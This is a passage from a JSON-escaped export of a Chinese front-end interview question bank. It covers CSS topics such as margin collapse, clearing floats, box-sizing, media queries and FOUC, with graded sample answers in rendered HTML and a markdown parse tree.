分）</h4>\\n<p>伪元素：在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。</p>\\n<p>伪类：将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。</p>\\n<h2>36. 为什么有时候⽤translate来改变位置⽽不是定位？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>translate 是 transform 属性的⼀个值。改变transform或opacity不会触发浏览器重新布局（reflow）或重绘（repaint），只会触发复合（compositions）。⽽改变绝对定位会触发重新布局，进⽽触发重绘和复合。transform使浏览器为元素创建⼀个 GPU 图层，但改变绝对定位会使⽤到 CPU。 因此translate()更⾼效，可以缩短平滑动画的绘制时间。⽽translate改变位置时，元素依然会占据其原始空间，绝对定位就不会发⽣这种情况。</p>\\n<h2>37. li 与 li 之间有看不见的空白间隔是什么原因引起的？如何解决？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>浏览器会把inline内联元素间的空白字符（空格、换行、Tab等）渲染成一个空格。为了美观，通常是一个li放在一行，这导致li换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。</p>\\n<p>解决办法：</p>\\n<ul>\\n<li><p>为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。</p>\\n</li>\\n<li><p>将所有li写在同一行。不足：代码不美观。</p>\\n</li>\\n<li><p>为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。</p>\\n</li>\\n<li><p>为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。</p>\\n</li>\\n</ul>\\n<h2>38. CSS3中有哪些新特性</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）</p>\\n</li>\\n<li><p>圆角 （border-radius:8px）</p>\\n</li>\\n<li><p>多列布局 （multi-column layout）</p>\\n</li>\\n<li><p>阴影和反射 （Shadoweflect）</p>\\n</li>\\n<li><p>文字特效 （text-shadow）</p>\\n</li>\\n<li><p>线性渐变 （gradient）</p>\\n</li>\\n<li><p>旋转 （transform）</p>\\n</li>\\n<li><p>增加了更多的CSS3选择器 多背景 rgba</p>\\n</li>\\n<li><p>在CSS3中唯一引入的伪元素是::selection</p>\\n</li>\\n<li><p>媒体查询，多栏布局</p>\\n</li>\\n<li><p>border-image</p>\\n</li>\\n</ul>\\n<h2>39. 对 CSSSprites 的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>CSSSprites（精灵图），将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的 background-image，background-repeat，background-position属性的组合进行背景定位。</p>\\n<p>优点：</p>\\n<ul>\\n<li><p>减少HTTP请求数，极大地提高页面加载速度</p>\\n</li>\\n<li><p>增加图片信息重复度，提高压缩比，减少图片大小</p>\\n</li>\\n<li><p>减少图片的总大小</p>\\n</li>\\n</ul>\\n<p>缺点：</p>\\n<ul>\\n<li><p>图片合并麻烦</p>\\n</li>\\n<li><p>维护麻烦，修改一个图片可能需要重新布局整个图片，样式调试工作量很大</p>\\n</li>\\n</ul>\\n<h2>40. 什么是物理像素，逻辑像素和像素密度，为什么在移动端开发时需要用到@3x, @2x这种图片？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>以 iPhone XS 为例，当写 CSS 代码时，针对于单位 px，其宽度为 414px &amp; 896px，也就是说当赋予一个 DIV元素宽度为 414px，这个 DIV 就会填满手机的宽度；</p>\\n<p>而如果有一把尺子来实际测量这部手机的物理像素，实际为 1242*2688 物理像素；经过计算可知，1242/414=3，也就是说，在单边上，一个逻辑像素=3个物理像素，就说这个屏幕的像素密度为 3，也就是常说的 3 倍屏。</p>\\n<p>对于图片来说，为了保证其不失真，1 个图片像素至少要对应一个物理像素，假如原始图片是 500300 像素，那么在 3 倍屏上就要放一个 1500900 像素的图片才能保证 1 个物理像素至少对应一个图片像素，才能不失真。</p>\\n<h2>41. margin 和 padding 的使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；</p>\\n</li>\\n<li><p>需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。</p>\\n</li>\\n</ul>\\n<h2>42. 对line-height 的理解及其赋值方式</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>line-height的概念：</p>\\n<ul>\\n<li><p>line-height 指一行文本的高度，包含了字间距，实际上是下一行基线到上一行基线距离；</p>\\n</li>\\n<li><p>如果一个标签没有定义 height 属性，那么其最终表现的高度由 line-height 决定；</p>\\n</li>\\n<li><p>一个容器没有设置高度，那么撑开容器高度的是 line-height，而不是容器内的文本内容；</p>\\n</li>\\n<li><p>把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中；</p>\\n</li>\\n<li><p>line-height 和 height 都能撑开一个高度；</p>\\n</li>\\n</ul>\\n<p>line-height 的赋值方式：</p>\\n<ul>\\n<li><p>带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高</p>\\n</li>\\n<li><p>纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px</p>\\n</li>\\n<li><p>百分比：将计算后的值传递给后代</p>\\n</li>\\n</ul>\\n<h2>43. CSS预处理器/后处理器是什么？为什么要使用它们？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>预处理器， 如：less，sass，stylus，用来预编译sass或者less，增加了css代码的复用性。层级，mixin， 变量，循环， 函数等对编写以及开发UI组件都极为方便。</p>\\n<p>后处理器， 如： postCss，通常是在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。</p>\\n<p>css预处理器为css增加一些编程特性，无需考虑浏览器的兼容问题，可以在CSS中使用变量，简单的逻辑程序，函数等在编程语言中的一些基本的性能，可以让css更加的简洁，增加适应性以及可读性，可维护性等。</p>\\n<p>使用原因：</p>\\n<p>结构清晰， 便于扩展</p>\\n<p>可以很方便的屏蔽浏览器私有语法的差异</p>\\n<p>可以轻松实现多重继承</p>\\n<p>完美的兼容了CSS代码，可以应用到老项目中</p>\\n<h2>44. 对媒体查询的理解？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>媒体查询由⼀个可选的媒体类型和零个或多个使⽤媒体功能的限制了样式表范围的表达式组成，例如宽度、⾼度和颜⾊。媒体查询，添加⾃CSS3，允许内容的呈现针对⼀个特定范围的输出设备⽽进⾏裁剪，⽽不必改变内容本身，适合web⽹⻚应对不同型号的设备⽽做出对应的响应适配。</p>\\n<p>媒体查询包含⼀个可选的媒体类型和满⾜CSS3规范的条件下，包含零个或多个表达式，这些表达式描述了媒体特征，最终会被解析为true或false。如果媒体查询中指定的媒体类型匹配展示⽂档所使⽤的设备类型，并且所有的表达式的值都是true，那么该媒体查询的结果为true。那么媒体查询内的样式将会⽣效。</p>\\n<pre><code class=\\"language-html\\">&lt;!-- link元素中的CSS媒体查询 --&gt; \\n&lt;link rel=&quot;stylesheet&quot; media=&quot;(max-width: 800px)&quot; href=&quot;example.css&quot; /&gt; \\n&lt;!-- 样式表中的CSS媒体查询 --&gt; \\n&lt;style&gt; \\n@media (max-width: 600px) { \\n  .facet_sidebar { \\n    display: none; \\n  } \\n}\\n&lt;/style&gt;\\n</code></pre>\\n<h2>45. 对 CSS 工程化的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>CSS 工程化是为了解决以下问题：</p>\\n<ul>\\n<li><p>宏观设计：CSS 代码如何组织、如何拆分、模块结构怎样设计？</p>\\n</li>\\n<li><p>编码优化：怎样写出更好的 CSS？</p>\\n</li>\\n<li><p>构建：如何处理我的 CSS，才能让它的打包结果最优？</p>\\n</li>\\n<li><p>可维护性：代码写完后，如何最小化后期的维护成本？</p>\\n</li>\\n<li><p>用户体验：在 CSS 的使用上，有哪些坑需要注意？</p>\\n</li>\\n</ul>\\n<p>以下三个方向都是时下比较流行的、普适性非常好的 CSS 工程化实践：</p>\\n<p>预处理器：Less、 Sass 等；</p>\\n<p>重要的工程化插件： PostCss；</p>\\n<p>Webpack loader 等 。</p>\\n<h2>46. 什么是margin重叠问题？如何解决？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>问题描述： 两个块级元素的上外边距和下外边距可能会合并（折叠）为一个外边距，其大小会取其中外边距值大的那个，这种行为就是外边距折叠。需要注意的是，浮动的元素和绝对定位这种脱离文档流的元素的外边距不会折叠。重叠只会出现在垂直方向。</p>\\n<p>解决办法： 对于折叠的情况，主要有两种：兄弟之间重叠和父子之间重叠 （1）兄弟之间重叠</p>\\n<ul>\\n<li><p>底部元素变为行内盒子：display: inline-block</p>\\n</li>\\n<li><p>底部元素设置浮动：float</p>\\n</li>\\n<li><p>底部元素的position的值为absolute/fixed</p>\\n</li>\\n</ul>\\n<p>父子之间重叠</p>\\n<ul>\\n<li><p>父元素加入：overflow: hidden</p>\\n</li>\\n<li><p>父元素添加透明边框：border:1px solid transparent</p>\\n</li>\\n<li><p>子元素变为行内盒子：display: inline-block</p>\\n</li>\\n<li><p>子元素加入浮动属性或定位</p>\\n</li>\\n</ul>\\n<h2>47. absolute与fixed共同点与不同点</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>共同点：</p>\\n<ul>\\n<li><p>改变行内元素的呈现方式，将display置为inline-block  </p>\\n</li>\\n<li><p>使元素脱离普通文档流，不占据空间</p>\\n</li>\\n<li><p>覆盖非定位文档元素</p>\\n</li>\\n</ul>\\n<p>不同点：</p>\\n<ul>\\n<li><p>abuselute与fixed的根元素不同，abuselute的根元素可以设置，fixed根元素是浏览器。</p>\\n</li>\\n<li><p>在有滚动条的页面中，absolute会跟着父元素进行移动，fixed固定在页面的具体位置。</p>\\n</li>\\n</ul>\\n<h2>48. box-sizing属性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>用来控制元素的盒子模型的解析模式，默认为content-box</p>\\n<p>context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是 content 部分的高/宽</p>\\n<p>**border-box：IE 传统盒子模型。**设置元素的 height/width 属性指的是 content + border + padding 部分的高/宽</p>\\n<h2>49. 为什么要初始化 CSS 样式</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。</p>\\n<h2>50. CSS里的 visibility 属性有个 collapse 属性值是干吗用的？在不同浏览器下以后什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>当一个元素的 <strong>visibility</strong> 属性被设置成 <strong>collapse</strong> 值后，对于一般的元素，它的表现跟 <strong>hidden</strong> 是一样的。但例外的是，如果这个元素是table相关的元素，例如table行，table group，table列，table column group，它的表现却跟 <strong>display: none</strong> 一样，也就是说，它们占用的空间也会释放。</p>\\n<p>在谷歌浏览器里，使用 <strong>collapse</strong> 值和使用 <strong>hidden</strong> 值没有什么区别。</p>\\n<p>在火狐浏览器、Opera和IE11里，使用 <strong>collapse</strong> 值的效果就如它的字面意思：table的行会消失，它的下面一行会补充它的位置。</p>\\n<h2>51. position 跟 display、overflow、float 这些特性相互叠加后会怎么样？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>display 属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。</p>\\n<p>类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。float 或者absolute定位的元素，只能是块元素或表格。</p>\\n<h2>52. 为什么会出现浮动? 什么时候需要清除浮动？清除浮动有哪些方式？优缺点是什么？你认为最好的是哪一种？为什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>出现浮动的原因：</p>\\n<p>浮动元素碰到包含它的边框或者浮动元素的边框停留。在CSS规范中，浮动定位不属于正常的页面流，而是独立定位的，所以文档流的块框表现得就像浮动框不存在一样。浮动元素会漂浮在文档流的块框上。</p>\\n<p>关于css的定位机制：普通流，浮动，绝对定位（position：fixed是position：absolute的一个子类）。浮动的框可以左右移动，直到它的外边缘遇到包含框或者另一个浮动框的边缘，所以才说浮动定位不属于正常的页面流。文档中的普通流就会表现得和浮动框不存在一样，当浮动框高度超出包含框的时候，就会出现包含框不会自动伸缩高度类笔盒浮动元素。所以，只含有浮动元素的父容器在显示时不需要考虑子元素的位置，就造成显示父容器像空容器一样。</p>\\n<p>浮动带来的问题：</p>\\n<ul>\\n<li><p>父元素的高度无法被撑开，影响与父元素同级的元素</p>\\n</li>\\n<li><p>与浮动元素同级的非浮动元素（内联元素）会跟随其后</p>\\n</li>\\n<li><p>若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构。</p>\\n</li>\\n</ul>\\n<p>清除浮动的方式：</p>\\n<ul>\\n<li><p>父级div定义height</p>\\n</li>\\n<li><p>最后一个浮动元素后加空div标签并设置属性 clear:both</p>\\n</li>\\n<li><p>包含浮动元素的父标签添加样式 overflow:hidden</p>\\n</li>\\n<li><p>父级div定义伪类:after 和 zoom</p>\\n</li>\\n<li><p>父级div定义伪类:after 和 display:table</p>\\n</li>\\n<li><p>父级div定义伪元素:after 和 content:” “</p>\\n</li>\\n</ul>\\n<p>最好的方式是给父元素添加overflow:hidden</p>\\n<h2>53. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>FOUC - Flash Of Unstyled Content 文档样式闪烁</p>\\n<p>当样式表晚于结构性html加载时，页面以无样式显示&gt;闪现&gt;再按样式展示出来，对于用户来说就是页面闪烁了一下</p>\\n<p>产生原因：</p>\\n<p>由于浏览器渲染机制（比如firefox）对CSS和HTML文件的解析顺序是不一样的。Firefox在解析html时，如果遇到link标签引入的css文件，那么它会暂停html的解析，优先加载css文件，CSS文件加载完毕后才会继续解析html，这就导致了“无样式内容闪烁”。</p>\\n<p>解决方法：</p>\\n<ul>\\n<li><p>把样式表放到文档的head</p>\\n</li>\\n<li><p>使用@import url()将样式导入</p>\\n</li>\\n<li><p>使用link标签将样式文件链接到HTML文件中</p>\\n</li>\\n</ul>\\n<h2>54. 浏览器是怎样解析CSS选择器的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>CSS选择器的解析是从右向左解析的，为了避免对所有元素进行遍历。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。\\n而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。</p>\\n<h2>55. 在网页中的应该使用奇数还是偶数的字体？为什么呢？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。</p>\\n<h2>56. 元素竖向的百分比设定是相对于容器的高度吗？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。</p>\\n<h2>57. 全屏滚动的原理是什么？用到了CSS的哪些属性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现\\noverflow：hidden；transition：all 1000ms ease；</p>\\n<h2>58.让页面里的字体变清晰，变细用CSS怎么做？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>-webkit-font-smoothing 在 window 系统下没有起作用，但是在 IOS 设备上起作用 -webkit-font-smoothing：antialiased 是最佳的，灰度平滑。</p>\\n<h2>59. position:fixed; 在 android 下无效怎么处理 ？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<pre><code class=\\"language-html\\">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no&quot;/&gt;\\n</code></pre>\\n<h2>60. 如果需要手动写动画，你认为最小时间间隔是多久，为什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms。</p>\\n","ast":[{"type":"heading","raw":"# CSS\\n\\n","depth":1,"text":"CSS","tokens":[{"type":"text","raw":"CSS","text":"CSS","escaped":false}]},{"type":"heading","raw":"## 1. CSS 有哪些选择器？权重是如何计算的？\\n\\n","depth":2,"text":"1. CSS 有哪些选择器？权重是如何计算的？","tokens":[{"type":"text","raw":"1. CSS 有哪些选择器？权重是如何计算的？","text":"1. CSS 有哪些选择器？权重是如何计算的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  + 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n  + 关系选择器：后代选择器、父子选择器、兄弟选择器\\n- **1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  + 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n  + 关系选择器：后代选择器、父子选择器、兄弟选择器\\n","task":false,"loose":false,"text":"**1：**\\n+ 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n+ 关系选择器：后代选择器、父子选择器、兄弟选择器","tokens":[{"type":"text","raw":"**1：**\\n","text":"**1：**","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]}]},{"type":"list","raw":"+ 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n+ 关系选择器：后代选择器、父子选择器、兄弟选择器","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n","task":false,"loose":false,"text":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","tokens":[{"type":"text","raw":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","text":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","tokens":[{"type":"text","raw":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","text":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","escaped":false}]}]},{"type":"list_item","raw":"+ 关系选择器：后代选择器、父子选择器、兄弟选择器","task":false,"loose":false,"text":"关系选择器：后代选择器、父子选择器、兄弟选择器","tokens":[{"type":"text","raw":"关系选择器：后代选择器、父子选择器、兄弟选择器","text":"关系选择器：后代选择器、父子选择器、兄弟选择器","tokens":[{"type":"text","raw":"关系选择器：后代选择器、父子选择器、兄弟选择器","text":"关系选择器：后代选择器、父子选择器、兄弟选择器","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","task":false,"loose":false,"text":"**1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","tokens":[{"type":"text","raw":"**1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","text":"**1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","text":" ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. margin 和 padding 的使用场景\\n\\n","depth":2,"text":"2. margin 和 padding 的使用场景","tokens":[{"type":"text","raw":"2. margin 和 padding 的使用场景","text":"2. margin 和 padding 的使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  + 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n  + 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  + 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n  + 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","task":false,"loose":false,"text":"**1：**\\n+ 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n+ 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"**1：**\\n","text":"**1：**","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]}]},{"type":"list","raw":"+ 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n+ 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n","task":false,"loose":false,"text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 